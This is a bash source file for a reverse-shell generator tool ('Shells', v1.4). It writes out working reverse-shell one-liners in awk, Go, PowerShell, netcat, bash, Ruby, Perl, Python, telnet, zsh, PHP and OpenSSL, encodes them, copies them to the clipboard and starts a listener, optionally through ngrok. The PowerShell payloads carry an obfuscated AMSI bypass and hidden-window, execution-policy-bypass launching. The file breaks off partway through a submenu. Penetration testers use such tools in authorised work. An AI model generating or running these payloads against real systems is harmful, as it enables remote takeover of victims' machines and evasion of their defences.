#!/bin/bash
#By Andreas Finstad - 4ndr34z
#Twitter: @4nqr34z
#Mastadon: 4ndr34z@infosec.exchange
#Web: https://f20.be

version="1.4"

### Colors ##
ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
GREEN="${ESC}[32m" YELLOW="${ESC}[33m" BLUE="${ESC}[34m" MAGENTA="${ESC}[35m"
CYAN="${ESC}[36m" WHITE="${ESC}[37m" DEFAULT="${ESC}[39m"

### Color Functions ##

greenprint() { printf "${GREEN}%s${RESET}\n" "$1"; }
blueprint() { printf "${BLUE}%s${RESET}\n" "$1"; }
redprint() { printf "${RED}%s${RESET}\n" "$1"; }
yellowprint() { printf "${YELLOW}%s${RESET}\n" "$1"; }
magentaprint() { printf "${MAGENTA}%s${RESET}\n" "$1"; }
cyanprint() { printf "${CYAN}%s${RESET}\n" "$1"; }
fn_bye() { printf "\n\nShell you later!\n\n"; exit 0; }
fn_fail() { echo "That is just not an option!"; mainmenu; }
#Header
function header () {
clear
yellowprint "
          _________.__           .__  .__          
         /   _____/|  |__   ____ |  | |  |   ______
         \_____  \ |  |  \_/ __ \|  | |  |  /  ___/
         /        \|   Y  \  ___/|  |_|  |__\___ \ 
        /_______  /|___|  /\___  >____/____/____  >
                \/      \/     \/               \/ By 4ndr34z         

v.$version
"

}
#Checking OS
OS=$(uname)
ngrok_installed=$(which ngrok)
if [ "$?" == 1 ]
then
    ngrok_installed=0
else
    ngrok_installed=1
    killall ngrok > /dev/null 2>&1
fi

usingngrok=0
#Check dependencies
benc=$(which basenc)

if [ "$?" == 1 ]
then
      header
      if [[ $OS == "Darwin" ]]
      then
    redprint "$0 depends on basenc from coreutils and cannot continue.
Install on MacOS using homebrew: brew install coreutils"
    yellowprint "Install now? [Y/n]"
    read -r -n 1 ans
    case $ans in
    y)
        echo
        echo "Installing..."
        brew install coreutils
        $0;;
    n)
        exit;;
    "")
        echo
        echo "Installing..."
        brew install coreutils
        $0;;
    *)
        exit;;
    esac


    else
    redprint "$0 depends on on basenc from coreutils and cannot continue.
Install on Debian: sudo apt install coreutils"
    yellowprint "Install now? [Y/n]"
    read -r -n 1 ans
    case $ans in
    y)
        echo
        echo "Installing..."
        sudo apt install coreutils
        $0;;
    n)
        exit;;
    "")
        echo
        echo "Installing..."
        sudo apt install coreutils
        $0;;
    *)
        exit;;
    esac

    fi
                

exit
fi



nc=$(which nc)

if [ "$?" == 1 ]
then
      header
                redprint "$0 depends on netcat and cannot continue.
Install on Debian: sudo apt install netcat"
exit
fi


rlwrap=$(which rlwrap)

if [ "$?" == 1 ]
then
      header
    if [[ $OS == "Darwin" ]]
    then
    redprint "$0 depends on rlwrap and cannot continue.
Install on MacOS using homebrew: brew install rlwrap"
    yellowprint "Install now? [Y/n]"
    read -r -n 1 ans
    case $ans in
    y)
        echo
        echo "Installing..."
        brew install rlwrap
        $0
        ;;
     n)
        exit;;
    "")
        echo
        echo "Installing..."
        brew install rlwrap
        $0;;

    *)
        exit;;
    esac

    else
                redprint "$0 depends on rlwrap and cannot continue.
Install on Debian: sudo apt install rlwrap"
    yellowprint "Install now? [Y/n]"
    read -r -n 1 ans
    case $ans in
    y)
        echo
        echo "Installing..."
        sudo apt install rlwrap
        $0
        ;;
    n)
        echo
        ;;
    "")
        echo
        echo "Installing..."
        sudo apt install rlwrap
        $0
        ;;
    *)
        echo
        ;;
    esac
    fi
#read -p "Press any key to continue"
fi

if [[ $ngrok_installed == 1 ]]
then
    jqcheck=$(which jq)

    if [ "$?" == 1 ]
    then
        header
        if [[ $OS == "Darwin" ]]
        then
            redprint "$0 depends on jq for ngrok usage. If you wish to use ngrok, it needs to be installed. Install on macOS using homebrew: brew install jq"
            yellowprint "Install now? [Y/n]"
            read -r -n 1 ans
            case $ans in
            y)
            echo
            echo "Installing..."
            brew install jq
            $0
            ;;
            n)
            echo
            ;;
            "")
            echo
            echo "Installing..."
            brew install jq
            $0
            ;;
            *)
            echo
            ;;
            esac

        else
            redprint "$0 depends on jq for ngrok and this will not work. Install on Debian: sudo apt install jq"
            yellowprint "Install now? [Y/n]"
            read -r -n 1 ans
            case $ans in
            y)
            echo
            echo "Installing..."
            sudo apt install jq
            $0
            ;;
            n)
            echo
            ;;
            "")
            echo
            echo "Installing..."
            sudo apt install jq
            $0
            ;;
            *)
            echo
            ;;
            esac
        fi

    fi
fi



function urlencodeme() {
 
    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c"
        esac
    done
}


#Find IP
if [[ $OS == "Darwin" ]]
then
     myip=$(ipconfig getifaddr en0)
else
    int=$(route | grep '^default' | grep -o '[^ ]*$')
    myip=$(ip -4 a show dev $int |grep inet|awk -F "inet" {'print $2'}|cut -d/ -f1 | xargs)
fi

myport="443"

header

function ip2hex () {
echo -n $1 | awk -F '.' '{printf "0x%x", ($1 * 2^24) + ($2 * 2^16) + ($3 * 2^8) + $4}'

}

function ip2long () {
echo -n $1 | awk -F '.' '{printf "%d", ($1 * 2^24) + ($2 * 2^16) + ($3 * 2^8) + $4}'

}

function input () {
if [[ $usingngrok == 1 ]]
then 
    echo "ngrok is running"
else
    header
    read -p "Please enter your listening IP [$myip]: " IP
    IP=${IP:-$myip}
    read -p "Please enter your listening port [$myport]: " PORT
    PORT=${PORT:-$myport}

if ! [[ "$1" == "ngrok" ]]
then

    HEXIP=$(ip2hex $IP)
    LONGIP=$(ip2long $IP)
    echo -ne "
    $(blueprint 'Format of IP')
    $(greenprint '1)') Normal
    $(greenprint '2)') Hexadecimal
    $(greenprint '3)') Long

Choose an option [1]:  "
    read -r -n 1 ans

    case $ans in
    1)
        IP=$IP
        ;;
    2)
        IP=$HEXIP
        ;;
    3)
        IP=$LONGIP
        ;;
    
    *)
        IP=$IP
        ;;
    esac
fi
fi
}

function start_ngrok () {
    if [[ $usingngrok == 0 ]]
        then
            ngrok tcp $PORT > /dev/null &
            header
            echo "Starting ngrok.."
        while ! nc -z localhost 4040; do
            sleep 1 # wait Ngrok to become available
        done
        public_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url'|awk -F"//" {'print $2'})
        local_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].config.addr')
        IP=$(echo -n $public_url|awk -F":" {'print $1'})
        PORT=$(echo -n $public_url|awk -F":" {'print $2'})
        LOCALPORT=$(echo -n $local_url|awk -F":" {'print $2'})
        usingngrok=1
        mainmenu
    else
        killall ngrok > /dev/null 2>&1
        usingngrok=0
        mainmenu
    fi

}

function awk_s () {
header
rev="awk 'BEGIN {s = \"/inet/tcp/0/$IP/$PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}

function go_lang () {
header
rev="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}

function powershell_s () {


if [[ $2 == "core" ]]
then 
    pw_sh="pwsh"
else
    pw_sh="powershell"
fi

#Windows?
if [[ $3 == "w" ]]
then 
    win="-W Hidden"
    userinfo="(& ([string]::join('', ( (105,101,120) |%{ ( [char][int] \$_)})) | % {\$_})([string]::join('', ( (40,36,101,110,118,58,117,83,101,82,78,97,77,69,41) |%{ ( [char][int] \$_)})) | % {\$_})) + '@' + (& ([string]::join('', ( (105,101,120) |%{ ( [char][int] \$_)})) | % {\$_})([string]::join('', ( (40,36,101,110,118,58,117,115,101,114,100,111,109,97,105,110,41) |%{ ( [char][int] \$_)})) | % {\$_})) + ([System.Environment]::NewLine) + ([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).path"
else
    userinfo="([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).path"
fi


client=$(openssl rand -hex $(shuf -i 1-11 -n1))
stream=$(openssl rand -hex $(shuf -i 1-11 -n1))
data=$(openssl rand -hex $(shuf -i 1-11 -n1))
sendback=$(openssl rand -hex $(shuf -i 1-11 -n1))
sendback2=$(openssl rand -hex $(shuf -i 1-11 -n1))
sendbyte=$(openssl rand -hex $(shuf -i 1-11 -n1))
bytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
i=$(openssl rand -hex $(shuf -i 1-11 -n1))
endpoint=$(openssl rand -hex $(shuf -i 1-11 -n1))
receivebytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
returndata=$(openssl rand -hex $(shuf -i 1-11 -n1))
x=$(openssl rand -hex $(shuf -i 1-11 -n1))
result=$(openssl rand -hex $(shuf -i 1-11 -n1))
a=$(openssl rand -hex $(shuf -i 1-11 -n1))
b=$(openssl rand -hex $(shuf -i 1-11 -n1))
c=$(openssl rand -hex $(shuf -i 1-11 -n1))
d=$(openssl rand -hex $(shuf -i 1-11 -n1))
e=$(openssl rand -hex $(shuf -i 1-11 -n1))
f=$(openssl rand -hex $(shuf -i 1-11 -n1))
g=$(openssl rand -hex $(shuf -i 1-11 -n1))
h=$(openssl rand -hex $(shuf -i 1-11 -n1))
i=$(openssl rand -hex $(shuf -i 1-11 -n1))
j=$(openssl rand -hex $(shuf -i 1-11 -n1))
k=$(openssl rand -hex $(shuf -i 1-11 -n1))

if [[ $4 == "udp" ]]
then
#UDP

shell="\$$a='slitUismA.';\$$b=\$$a+'noitamotuA';\$$c=\$$b.PadRight(21,'.');\$$d=\$$c+'tnemeganaM';\$$e=\$$d.PadRight(32,'.');\$$f=\$$e+'metsyS';\$$g=\$$f.ToCharArray();[array]::Reverse(\$$g);\$$h= -join(\$$g);\$$i='deliaFtinIisma';\$$j=\$$i.ToCharArray();[array]::Reverse(\$$j);\$$k= -join(\$$j);[Ref].Assembly.GetType(\$$h).GetField(\$$k,'NonPublic,Static').SetValue(\$null,\$true);\$$endpoint = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,121,83,84,101,109,46,78,101,84,46,105,80,101,78,100,112,111,105,110,84) |%{ ( [char][int] \$_)})) | % {\$_}) ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (83,121,83,84,101,109,46,110,69,116,46,115,111,67,107,101,84,115,46,117,68,80,99,108,105,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_}) ($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes(([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (& ([string]::join('', ( (105,101,120) |%{ ( [char][int] \$_)})) | % {\$_}) \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  ([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"

else
#TCP
    shell="\$$a='slitUismA.';\$$b=\$$a+'noitamotuA';\$$c=\$$b.PadRight(21,'.');\$$d=\$$c+'tnemeganaM';\$$e=\$$d.PadRight(32,'.');\$$f=\$$e+'metsyS';\$$g=\$$f.ToCharArray();[array]::Reverse(\$$g);\$$h= -join(\$$g);\$$i='deliaFtinIisma';\$$j=\$$i.ToCharArray();[array]::Reverse(\$$j);\$$k= -join(\$$j);[Ref].Assembly.GetType(\$$h).GetField(\$$k,'NonPublic,Static').SetValue(\$null,\$true);\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,89,83,116,101,77,46,110,69,116,46,115,79,99,75,69,116,115,46,116,67,80,67,108,73,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_})('$IP',\$(0-0+0+0-0-0+0+$PORT));\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..$((65535))|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (& ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo + '>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"

fi

shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)

rev="${pw_sh} ${win} -noprofile -executionpolicy bypass -NoExit -e ${shell}"


if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")
fi

if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi

    listen $4
}

function netcat () {
header

if [[ $2 == "loop" ]] 
then
    rev="while true; do sleep 10 && mknod /dev/shm/p p; cat /dev/shm/p | bash -i | nc $IP $PORT >/dev/shm/p; done"
else 
    rev="rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh"
fi
if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme $rev)
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}


function bash_i () {
header
rev="sh -i >& /dev/$2/$IP/$PORT 0>&1"


if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen "$2"
}

function ruby () {
header
rev="ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$IP\",$PORT))'"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}



function open_s () {
header
#echo "Generating certificate..."
openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=shells.com"
rev="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen "" "open_s"
}



function perl () {
header
rev="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}

function python () {
header


if [[ $1 == "python" ]] 

then
    pythonv="python"

elif [[ $1 == "python3" ]] 

then
    pythonv="python3"
fi

rev="$pythonv -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
wrev2="python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$IP', $PORT)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
wrev3="python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('$IP',$PORT));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\""

if [[ $1 == "wpython" ]] 

then
    rev=$wrev2

elif [[ $1 == "wpython3" ]] 

then
    rev=$wrev3
fi

if [[ $2 == "url" ]] 

then

    rev=$(urlencodeme "$rev")

elif [[ $2 == "urlx2" ]] 

then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")
fi

if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen

}


function telnet () {
header
rev="e=\$(mktemp -u);mkfifo \$e && telnet $IP $PORT 0<\$e | sh 1>\$e"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}



function zsh () {
header
rev="zsh -c 'zmodload zsh/net/tcp && ztcp $IP $PORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}

function php () {
header
if [[ $2 == "" ]]
then
    exec="exec"
else
    exec=$2
fi

rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"bash <&3 >&3 2>&3\";$exec("\$c");'"

if [[ $1 == "url" ]] 
then
    rev=$(urlencodeme "$rev")
elif [[ $1 == "urlx2" ]] 
then
    rev=$(urlencodeme "$rev")
    rev=$(urlencodeme "$rev")

elif [[ $1 == "base64" ]] 
then
    rev=$(echo -n $rev|$benc --base64url -w0)
fi
if [[ $OS == "Darwin" ]]
then
   echo -n $rev | pbcopy
else 
    echo -n $rev | xclip -sel c
fi
listen
}

#Listener
function listen () {
header
printf "The following has been copied to your clipboard:\n\n"
echo $rev
printf "\n\n"
if [[ $1 == "udp" ]]
then
    prot="-u"
fi
 echo -ne "

$(blueprint 'Listener')
$(greenprint '1)') rlwrap nc $1
$(greenprint '2)') nc $1
$(greenprint '3)') OpenSSL
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit
Choose an option [1]:  "

if [[ $usingngrok == 1 ]]
then
    PORT=$LOCALPORT
fi
    read -r -n 1 ans

    case $ans in
    1)
        if [[ $OS == "Darwin" ]]
        then
            
                printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
                $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
        else
        printf "\n\n";$rlwrap -cAr $nc $prot -lvnp $PORT
        fi
        
        ;;
    2)
        if [[ $OS == "Darwin" ]]
        then
                printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
                $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
        else
        printf "\n\n";$nc $prot -lvnp $PORT
        fi
        
        ;;
    3)
        echo
        echo "Listening on port: $PORT"
        openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port "$PORT"
        
        ;;
   
    m)
        mainmenu
        ;;
        
    0)
        fn_bye
        ;;
    "")
        if [[ $OS == "Darwin" ]]
        then
            printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
            $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
        else
        printf "\n\n";$rlwrap -cAr $nc $prot -lvnp $PORT
        fi
        ;;
    esac

}

submenu_ruby() {
header
    echo -ne "
$(blueprint 'Ruby')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        ruby 
        ;;
    2)
        ruby "base64"
        ;;
    3)
        ruby "url"
        ;;
    4)
        ruby "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_powershell() {
header
    echo -ne "
$(blueprint 'Powershell')
$(greenprint '1)') Powershell TCP - Windows 
$(greenprint '2)') Powershell TCP - Windows URL encoded
$(greenprint '3)') Powershell TCP - Windows Double URL encoded
$(greenprint '4)') Powershell TCP - Windows Core
$(greenprint '5)') Powershell TCP - Windows Core URL encoded
$(greenprint '6)') Powershell TCP - Windows Core Double URL encoded
$(greenprint '7)') Powershell TCP - Core
$(greenprint '8)') Powershell TCP - Core URL encoded
$(greenprint '9)') Powershell TCP - Core Double URL encoded
$(greenprint '10)') Powershell UDP - Windows 
$(greenprint '11)') Powershell UDP - Windows URL encoded
$(greenprint '12)') Powershell UDP - Windows Double URL encoded
$(greenprint '13)') Powershell UDP - Windows Core
$(greenprint '14)') Powershell UDP - Windows Core URL encoded
$(greenprint '15)') Powershell UDP - Windows Core Double URL encoded
$(greenprint '16)') Powershell UDP - Core
$(greenprint '17)') Powershell UDP - Core URL encoded
$(greenprint '18)') Powershell UDP - Core Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 2 ans
    case $ans in
    1)
        powershell_s "" "" "w"
        ;;
    2)
        powershell_s "url" "" "w"
        ;;
    3)
        powershell_s "urlx2" "" "w"
        ;;
    4)
        powershell_s "" "core" "w"
        ;;
    5)
        powershell_s "url" "core" "w"
        ;;
    6)
        powershell_s "urlx2" "core" "w"
        ;;
    7)
        powershell_s "" "core"
        ;;
    8)
        powershell_s "url" "core"
        ;;
    9)
        powershell_s "urlx2" "core"
        ;;
    10)
        powershell_s "" "" "w" "udp"
        ;;
    11)
        powershell_s "url" "" "w" "udp"
        ;;
    12)
        powershell_s "urlx2" "" "w" "udp"
        ;;
    13)
        powershell_s "" "core" "w" "udp"
        ;;
    14)
        powershell_s "url" "core" "w" "udp"
        ;;
    14)
        powershell_s "urlx2" "core" "w" "udp"
        ;;
    16)
        powershell_s "" "core" "" "udp"
        ;;
    17)
        powershell_s "url" "core" "" "udp"
        ;;
    18)
        powershell_s "urlx2" "core" "" "udp"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_go_lang() {
header
    echo -ne "
$(blueprint 'Golang')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        go_lang 
        ;;
    2)
        go_lang "base64"
        ;;
    3)
        go_lang "url"
        ;;
    4)
        go_lang "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_php() {
header
    echo -ne "
$(blueprint 'PHP')
$(greenprint '1)') exec No encoding
$(greenprint '2)') exec Base64 encoded
$(greenprint '3)') exec URL encoded
$(greenprint '4)') exec Double URL encoded
$(greenprint '5)') system No encoding
$(greenprint '6)') system Base64 encoded
$(greenprint '7)') system URL encoded
$(greenprint '8)') system Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        php 
        ;;
    2)
        php "base64"
        ;;
    3)
        php "url"
        ;;
    4)
        php "urlx2"
        ;;
    5)
        php "" "system"
        ;;
    6)
        php "base64" "system"
        ;;
    7)
        php "url" "system"
        ;;
    8)
        php "urlx2" "system"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}


submenu_telnet() {
header
    echo -ne "
$(blueprint 'Telnet')
$(greenprint '1)') No encoding
$(greenprint '2)') Base64 encoded
$(greenprint '3)') URL encoded
$(greenprint '4)') Double URL encoded
$(magentaprint 'm)') Go Back to Main Menu
$(redprint '0)') Exit

Choose an option:  "
    read -r -n 1 ans
    case $ans in
    1)
        telnet 
        ;;
    2)
        telnet "base64"
        ;;
    3)
        telnet "url"
        ;;
    4)
        telnet "urlx2"
        ;;
    m)
        mainmenu
        ;;
    0)
        fn_bye
        ;;
    
    *)
        fn_fail
        ;;
    esac
}

submenu_perl() {
header
    echo -ne "
